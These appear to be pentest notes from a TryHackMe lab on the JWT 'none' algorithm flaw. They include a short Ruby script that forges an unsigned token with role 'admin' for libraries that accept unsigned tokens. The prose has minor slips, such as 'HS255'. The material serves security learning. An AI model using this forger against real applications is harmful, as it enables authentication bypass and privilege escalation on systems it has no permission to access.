# JWT Walkthrough with None Algorithm
#pentest/tryhackme

In addition to the previous vulnerability, certain JWT libraries have another devastating vulnerability. There is actually three possible algorithms, two of them RS256 and `HS256` which we have already studied. There is a third algorithm, known as `None`. According to the official  [JWT RFC](https://tools.ietf.org/html/rfc7519)  the None algorithm is used when you still want to use JWT, however there is other security in place to stop people from spoofing data. 

Unfortunately certain JWT libraries clearly didn't read the RFC, allowing a vulnerability where an attacker can switch to the None algorithm, in the same way one switches to `RS256` to `HS255`, and have the token be completely valid without even needing to calculate a secret.

## Ruby script

```rb
require 'openssl'
require 'base64'
require 'json'

def encode(hash_content)
  Base64.encode64(
    JSON.generate(hash_content)
  ).tr('+/', '-_').gsub(/[\n=]/, '')
end

def encode_signature(message)
  Base64.encode64('').tr('+/', '-_').gsub(/[\n=]/, '')
end

def jwt(header, payload_hash)
  encoded_header = encode(header)
  encoded_payload = encode(payload_hash)
  encoded_signature = encode_signature(
    [encoded_header, encoded_payload].join('.')
  )

  [encoded_header, encoded_payload, encoded_signature].join('.')
end

puts jwt(
  { typ: 'JWT', alg: 'none', kid: 'ls'},
  {
    auth: 1592191774757,
    agent: "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    role: "admin",
    iat: 1592191775
  }
)
```
